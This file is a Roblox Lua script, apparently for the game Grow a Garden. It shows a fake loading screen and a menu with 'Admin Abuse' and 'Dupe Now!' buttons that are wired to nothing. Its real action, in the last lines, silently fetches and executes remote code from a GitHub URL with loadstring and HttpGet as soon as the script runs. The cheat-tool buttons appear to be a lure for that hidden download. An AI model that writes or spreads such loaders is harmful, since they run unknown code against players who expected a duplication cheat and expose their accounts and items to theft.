-- Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Loading Screen
local loadingScreen = Instance.new("ScreenGui", playerGui)
loadingScreen.Name = "LoadingScreen"
loadingScreen.ResetOnSpawn = false

local loadingFrame = Instance.new("Frame", loadingScreen)
loadingFrame.Size = UDim2.new(1, 0, 1, 0)
loadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

local loadingText = Instance.new("TextLabel", loadingFrame)
loadingText.Size = UDim2.new(1, 0, 1, 0)
loadingText.Text = "Loading..."
loadingText.Font = Enum.Font.Cartoon
loadingText.TextSize = 48
loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingText.BackgroundTransparency = 1

-- Wait a few seconds to simulate loading
wait(3)

-- Fade out loading screen
TweenService:Create(loadingFrame, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
TweenService:Create(loadingText, TweenInfo.new(1), {TextTransparency = 1}):Play()
wait(1.1)
loadingScreen:Destroy()

-- Main GUI
local mainGui = Instance.new("ScreenGui", playerGui)
mainGui.Name = "CustomGui"
mainGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame", mainGui)
mainFrame.Size = UDim2.new(0, 300, 0, 150)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
mainFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
mainFrame.BorderSizePixel = 0
mainFrame.BackgroundTransparency = 0.05

-- UICorner for modern rounded look
local uiCorner = Instance.new("UICorner", mainFrame)
uiCorner.CornerRadius = UDim.new(0, 12)

-- Layout
local uiListLayout = Instance.new("UIListLayout", mainFrame)
uiListLayout.Padding = UDim.new(0, 10)
uiListLayout.FillDirection = Enum.FillDirection.Vertical
uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center

-- Button creation function
local function createButton(name)
	local button = Instance.new("TextButton", mainFrame)
	button.Size = UDim2.new(0.8, 0, 0, 40)
	button.Text = name
	button.Font = Enum.Font.Cartoon
	button.TextSize = 24
	button.TextColor3 = Color3.fromRGB(255, 255, 255)
	button.BackgroundColor3 = Color3.fromRGB(65, 65, 65)
	button.AutoButtonColor = true
	local corner = Instance.new("UICorner", button)
	corner.CornerRadius = UDim.new(0, 10)
	return button
end

-- Create Buttons
local adminAbuseButton = createButton("Admin Abuse")
local dupeNowButton = createButton("Dupe Now!")

-- Action: Load external script
pcall(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/lowznt/growagarden/refs/heads/main/growagarden.lua"))()
end)
